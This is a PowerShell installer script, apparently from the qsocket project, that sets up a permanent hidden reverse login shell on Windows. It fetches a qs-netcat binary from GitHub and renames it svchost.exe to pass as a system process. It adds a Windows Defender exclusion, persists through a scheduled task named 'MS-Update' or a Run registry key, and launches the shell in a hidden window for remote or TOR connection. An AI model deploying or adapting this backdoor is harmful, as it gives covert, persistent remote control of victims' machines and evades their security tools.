# Install and start a permanent qs-netcat reverse login shell
#
# See https://qsocket.io/ for examples.
# 
# $env:DEBUG=1 for verbose output.

$GITHUB_REPO="https://api.github.com/repos/qsocket"
$QS_UTIL="qs-netcat"
$QS_BIN_NAME="qs-netcat.exe"
$QS_BIN_HIDDEN_NAME="svchost.exe"
$QS_SCHEDULED_TASK_NAME="MS-Update"
$BANNER=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8gIElOID4gICAgICAgICAgICAgICAgICAgICAgICAgICItXyAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvICAgICAgLiAgfCAgLiAgICDjg73gvLzguojZhM2c4LqI4Ly9KSk+PS0gICAgICAgXCAgICAgICAgICAKICAg4Ly844Gk4LKg55uK4LKg4Ly944GkIOKUgD3iiaHOo08pKSAgIF8gICAgICAgIF8gICAgICAgLyAgICAgIDogXCB8IC8gOiAgICAgICAgICAgICAgICAgICAgICAgXCAgICAgICAgIAogICBfXyBfIF9fXyAgX19fICAgX19ffCB8IF9fX19ffCB8XyAgICAvICAgICAgICAnLV9fXy0nICAgICAgICAgIOKYnCjinY3htKXinY3KiykpPi0gICAgXCAgICAgIAogIC8gX2AgLyBfX3wvIF8gXCAvIF9ffCB8LyAvIF8gXCBfX3wgIC9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXyBcICAgICAgCiB8IChffCBcX18gXCAoXykgfCAoX198ICAgPCAgX18vIHxfICAgICAgICBfX19fX19ffCB8X19fX19fX19fX19fX19fX19fX19fX19fLS0iIi1MIAogIFxfXywgfF9fXy9cX19fLyBcX19ffF98XF9cX19ffFxfX3wgICAgICAvICAgICAgIEYgSiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwgCiAgICAgfF98ICAgQ29weXJpZ2h0IChjKSAyMDIzIFFzb2NrZXQgICAgLyAgICAgICBGICAgSiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTAogIGh0dHBzOi8vZ2l0aHViLmNvbS9xc29ja2V0LyAgICAgICAgICAgLyAgICAgIDonICAgICAnOiAgIOKUgD3iiaHOoygoKCDjgaTil5XZhM2c4peVKeOBpCAgICAgICAgIEYKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLyAgT1VUIDwgJy1fX18tJyAgICAgICAgICAgICAgICAgICAgICAgICAgICAvIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXy0tIgoK")) | Out-String

function Print-Warning($str)
{
    Write-Host "[!] " -ForegroundColor Yellow -NoNewline; 
    Write-Host "$str" 
}

function Print-Status($str)
{
    Write-Host "[*] " -ForegroundColor Yellow -NoNewline; 
    Write-Host "$str" 
}

function Print-Success($str)
{
    Write-Host "[+] " -ForegroundColor Green -NoNewline; 
    Write-Host "$str" 
}

function Print-Error($str)
{
    Write-Host "[-] " -ForegroundColor Red -NoNewline; 
    Write-Host "$str" 
}

function Print-Fatal($str)
{
    Write-Host "[!] " -ForegroundColor Red -NoNewline; 
    Write-Host "$str" 
    exit 1
}

function Print-Progress($str)
{
    if (-Not (Test-Path 'env:DEBUG')) { 
        Write-Host "[*] " -ForegroundColor Yellow -NoNewline;
        Write-Host "$str" -NoNewline;
        Write-Host ("."*(60-$str.Length)) -NoNewline;
    }  
}

function Print-Ok()
{
    if (-Not (Test-Path 'env:DEBUG')) { 
        Write-Host "[" -NoNewline;
        Write-Host "OK" -ForegroundColor Green -NoNewline;
        Write-Host "]";
    }  
}

function Print-Fail()
{
    if (-Not (Test-Path 'env:DEBUG')) { 
        Write-Host "[" -NoNewline;
        Write-Host "FAIL" -ForegroundColor Red -NoNewline;
        Write-Host "]";
    }  
}

function Print-Debug($str)
{
    if (Test-Path 'env:DEBUG') { 
        Write-Host "[*] " -ForegroundColor Yellow -NoNewline; 
        Write-Host "$str" 
    }  
}

function Is-Administrator  
{  
    return [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
}

function Get-Latest-Release  
{

    $QS_PACKAGE="windows_386.tar.gz"
    Switch ($Env:PROCESSOR_ARCHITECTURE)
    {
        "x86" {$QS_PACKAGE="windows_386.tar.gz"}
        "AMD64" {$QS_PACKAGE="windows_amd64.tar.gz"}
        "ARM64" {$QS_PACKAGE="windows_arm64.tar.gz"}
        "ARM" {$QS_PACKAGE="windows_arm.tar.gz"}
        default {Print-Fatal "Unsupported Windows architecture!"}
    }
    Print-Debug "Package: $QS_PACKAGE"

    try {
        $r = Invoke-WebRequest "$GITHUB_REPO/$QS_UTIL/releases/latest"
        $lines = $r.Content.Split('"')
        $uri=(echo $lines | Select-String '/releases/download/' | Select-String "$QS_PACKAGE")
    }catch {
        Print-Debug $_.Exception
        throw $_.Exception
    }
    return $uri.Line.split()
}

function Download-Qsocket-Util($path)
{
    try {
        $downloadUrl = Get-Latest-Release
        Print-Debug "Latest Release: $downloadUrl"
        $WebClient = New-Object System.Net.WebClient
        $WebClient.Headers.Add("Accept","application/octet-stream")
        $WebClient.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
        $WebClient.DownloadFile($downloadUrl, $path)
        if(Test-Path -Path "$path" -PathType Leaf){
            Print-Debug "Qsocket binary downloaded under: $path"
        }
    }catch{
        Print-Debug $_.Exception
        throw $_.Exception
    }
}

function Create-Sceduled-Task($path, $secret)
{
    Print-Debug "Creating scheduled task..."
    Print-Debug "Task command: cmd.exe /c ($path\$QS_BIN_HIDDEN_NAME -liqs $secret"
    try {
        $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c ($path\$QS_BIN_HIDDEN_NAME -liqs $secret"
        $T = New-ScheduledTaskTrigger -AtStartup
        if(Is-Administrator){
            $P = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
        }else{
            $P = New-ScheduledTaskPrincipal "$env:USERNAME"
        }
        $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P
        $S = New-ScheduledTaskSettingsSet
        Register-ScheduledTask "${QS_SCHEDULED_TASK_NAME}_${RAND_NAME}" -InputObject $D | out-null
    }catch {
        Print-Debug $_.Exception
        throw $_.Exception
    }
}

function Create-Run-Key($path, $secret)
{
    Print-Debug "Adding CurrentVersion\Run registery..."
    try {
        if(Is-Administrator){
            Print-Debug "Running as administrator"
            reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "$path" /t REG_SZ /d "$path\$QS_BIN_HIDDEN_NAME -liqs $secret" >$null
        }else{
            Print-Debug "Running as $env:UserName"
            reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "$path" /t REG_SZ /d "$path\$QS_BIN_HIDDEN_NAME -liqs $secret" >$null
        }
    }catch {
        Print-Debug $_.Exception
        throw $_.Exception
    }
    Print-Debug "Auto-run key added successfully"  
}

function Print-Usage
{
    Write-Host " `n"
    Write-Host "# >>> Connect ============> qs-netcat -i -s $SECRET" -ForegroundColor Green
    Write-Host "# >>> Connect With TOR ===> qs-netcat -T -i -s $SECRET" -ForegroundColor Green
    Write-Host " `n"
}


Write-Host "$BANNER"
$SECRET= -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
# Print-Status "Secret: $SECRET"
$RAND_NAME= -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
# Create QS_PATH
$QS_PATH= Join-Path -Path "$env:APPDATA" -ChildPath "$RAND_NAME" 
Print-Status "QSocket Path: $QS_PATH"
mkdir $QS_PATH >$null

if (Is-Administrator) {
    Print-Progress "Adding defender exclusion path"
    try {
        Add-MpPreference -ExclusionPath "$QS_PATH" >$null
        Print-Ok
    }catch {
        Print-Fail
    }
}

# Download the latest qsocket utility
try {
    Print-Progress "Downloading binaries"
    Download-Qsocket-Util(Join-Path -Path $QS_PATH -ChildPath "$RAND_NAME.tar.gz")
    Print-Ok  
}catch {
    Print-Fail
    Print-Fatal "Failed downloading QSocket util."
}

# Extract TAR.GZ to QS_PATH
try {
    Print-Progress "Unpacking binaries"
    tar zx -C "$QS_PATH" -f (Join-Path -Path $QS_PATH -ChildPath "$RAND_NAME.tar.gz") 2>$null
    Print-Ok
}catch{
    Print-Fail
    Print-Fatal "Failed extracting Qsocket util."
}

try {
    Print-Progress "Copying binaries"
    Remove-Item -Path (Join-Path -Path $QS_PATH -ChildPath "$RAND_NAME.tar.gz")
    Rename-Item -Path (Join-Path -Path $QS_PATH -ChildPath "$QS_BIN_NAME") -NewName "$QS_BIN_HIDDEN_NAME"
    if(! (Test-Path -Path (Join-Path -Path $QS_PATH -ChildPath "$QS_BIN_HIDDEN_NAME") -PathType Leaf)){
        Print-Fail
        Print-Fatal "Move failed. ->  $QS_PATH\$QS_BIN_HIDDEN_NAME"
    }
    Print-Ok
}catch {
    Print-Fail
    Print-Fatal "Unable to copy qsocket binaries."
}

try {
    Print-Progress "Testing qsocket binaries"
    # $SECRET = ((Start-Process -Wait (Join-Path -Path $QS_PATH -ChildPath "$QS_BIN_HIDDEN_NAME") "-g" -NoNewWindow) | Out-String)
    Print-Ok
}catch{
    Print-Fail
    Print-Fatal "Binary test failed! Exiting..."
}

if ($SECRET.Length -eq 0) {
    Print-Fatal "QSocket binary not working properly! Exiting..."
}

try {
    Print-Progress "Installing system wide permenant access"
    if (Is-Administrator) {
        Create-Sceduled-Task $QS_PATH $SECRET
    }else{
        Create-Run-Key $QS_PATH $SECRET
    }
    Print-Ok
}catch{
    Print-Fail
    Print-Warning "Permanent install methods failed! Access will be lost after reboot."
}


try {
    Print-Progress "Starting qsocket utility"
    Print-Debug (Join-Path -Path $QS_PATH -ChildPath "$QS_BIN_HIDDEN_NAME")
    Start-Process (Join-Path -Path $QS_PATH -ChildPath "$QS_BIN_HIDDEN_NAME") "-l -i -q -s $secret" -WindowStyle Hidden
    Print-Ok
}catch{
    Print-Fail
}
Print-Usage